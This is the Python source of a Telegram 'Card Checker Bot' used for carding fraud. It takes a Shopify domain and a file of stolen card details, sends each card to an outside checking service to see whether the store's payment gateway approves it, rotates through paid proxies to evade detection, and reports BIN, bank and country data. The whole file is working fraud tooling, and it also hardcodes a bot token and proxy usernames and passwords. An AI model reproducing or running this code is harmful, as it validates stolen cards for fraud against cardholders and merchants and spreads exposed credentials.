import requests
import time
import threading
from itertools import cycle
import telebot
from telebot import types

# Bot configuration
BOT_TOKEN = "7339843267:AAEbQdcnQ8uLjynOTx7SIoR-FJHsPLQ_VXU"
bot = telebot.TeleBot(BOT_TOKEN)

# Proxy configuration
PROXIES = [
    "154.88.60.89:56671:isgwbunl:sn9D9c1D3o",
    "154.194.47.203:49515:isgwbunl:sn9D9c1D3o",
    "154.88.62.158:55816:isgwbunl:sn9D9c1D3o",
    "154.88.61.241:56049:isgwbunl:sn9D9c1D3o",
    "154.194.216.28:65430:isgwbunl:sn9D9c1D3o",
    "154.88.63.180:56922:isgwbunl:sn9D9c1D3o",
    "proxy-nl.seedbox.fr:3128:gege838383:helios9999"
]

# Convert proxies to requests format
proxy_cycle = cycle([
    {
        'http': f'http://{user}:{passw}@{host}:{port}',
        'https': f'http://{user}:{passw}@{host}:{port}'
    }
    for proxy in PROXIES
    for host, port, user, passw in [proxy.split(':', 3)]
])

# User state tracking
user_states = {}
lock = threading.Lock()

def bin_lookup(bin_number, proxy):
    try:
        r = requests.get(
            f"https://api.voidex.dev/api/bin?bin={bin_number}",
            proxies=proxy,
            timeout=10
        )
        data = r.json()
        return {
            "brand": data.get("brand", "N/A"),
            "level": data.get("level", "N/A"),
            "type": data.get("type", "N/A"),
            "bank": data.get("bank", "N/A"),
            "country": data.get("country_name", "N/A"),
            "flag": data.get("country_flag", ""),
        }
    except:
        return {
            "brand": "N/A", "level": "N/A", "type": "N/A",
            "bank": "N/A", "country": "N/A", "flag": ""
        }

def check_card(domain, fullz, proxy):
    try:
        url = f"https://arpitchk.shop/auto.php?domain={domain}&fullz={fullz}"
        res = requests.get(url, proxies=proxy, timeout=30)
        data = res.json()
        bin_number = fullz.split("|")[0][:6]
        bin_data = bin_lookup(bin_number, proxy)

        status_raw = data.get("Response", "")
        status = "Approved ✅" if "APPROVED" in status_raw.upper() else "Declined ❌"
        gateway = data.get("Gateway", "N/A")
        price = data.get("Price", "0.00")

        result = f"""
━━━━━━━━━━━━━━━━━━━━━
⊙ Card: {fullz}
⊙ Status: {status}
⊙ Gateway: {gateway} | {price}$
⊙ Response: {status_raw}
⊙ BIN: {bin_number}
⊙ Info: {bin_data['brand']} - {bin_data['level']} - {bin_data['type']}
⊙ Bank: {bin_data['bank']}
⊙ Country: {bin_data['country']} {bin_data['flag']}
━━━━━━━━━━━━━━━━━━━━━
"""
        return result
    except Exception as e:
        return f"❌ Error on {fullz} → {str(e)}"

def process_cards(domain, cards, chat_id):
    bot.send_message(chat_id, f"🚀 Started processing {len(cards)} cards...")
    
    for i, card in enumerate(cards, 1):
        with lock:
            proxy = next(proxy_cycle)
        
        result = check_card(domain, card.strip(), proxy)
        bot.send_message(chat_id, result)
        time.sleep(2)
        
        if i % 5 == 0:
            bot.send_message(chat_id, f"⏳ Processed {i}/{len(cards)} cards...")
    
    bot.send_message(chat_id, "✅ All cards processed!")

@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    help_text = """
💳 *Card Checker Bot*

1. Send /check to start
2. Send your Shopify domain (e.g. `https://examplestore.com`)
3. Send a TXT file with cards (format: `cc|mm|yyyy|cvv`)

Each card will be checked with rotating proxies.
"""
    bot.reply_to(message, help_text, parse_mode='Markdown')

@bot.message_handler(commands=['check'])
def start_check(message):
    chat_id = message.chat.id
    user_states[chat_id] = {"state": "waiting_domain"}
    bot.send_message(chat_id, "🔹 Please send your Shopify domain (e.g. https://examplestore.com)")

@bot.message_handler(func=lambda message: user_states.get(message.chat.id, {}).get("state") == "waiting_domain")
def handle_domain(message):
    chat_id = message.chat.id
    domain = message.text.strip()
    
    if not domain.startswith('http'):
        bot.send_message(chat_id, "❌ Invalid domain format. Please include http:// or https://")
        return
    
    user_states[chat_id] = {
        "state": "waiting_file",
        "domain": domain
    }
    bot.send_message(chat_id, "🔹 Domain accepted. Now send your TXT file with cards")

@bot.message_handler(content_types=['document'], 
                    func=lambda message: user_states.get(message.chat.id, {}).get("state") == "waiting_file")
def handle_file(message):
    chat_id = message.chat.id
    user_state = user_states.get(chat_id, {})
    
    if message.document.mime_type != 'text/plain':
        bot.send_message(chat_id, "❌ Invalid file type. Please send a TXT file")
        return
    
    try:
        file_info = bot.get_file(message.document.file_id)
        file_content = bot.download_file(file_info.file_path).decode('utf-8')
        cards = [line.strip() for line in file_content.splitlines() if line.strip()]
        
        if not cards:
            bot.send_message(chat_id, "❌ No valid cards found in the file")
            return
        
        domain = user_state["domain"]
        bot.send_message(chat_id, f"📥 File received with {len(cards)} cards. Starting processing...")
        
        # Start processing in a new thread
        threading.Thread(
            target=process_cards,
            args=(domain, cards, chat_id),
            daemon=True
        ).start()
        
        # Clear user state
        del user_states[chat_id]
        
    except Exception as e:
        bot.send_message(chat_id, f"❌ Error processing file: {str(e)}")

@bot.message_handler(func=lambda message: True)
def handle_other(message):
    bot.reply_to(message, "❌ Unrecognized command. Send /help for instructions")

if __name__ == "__main__":
    print("Bot is running...")
    bot.infinity_polling()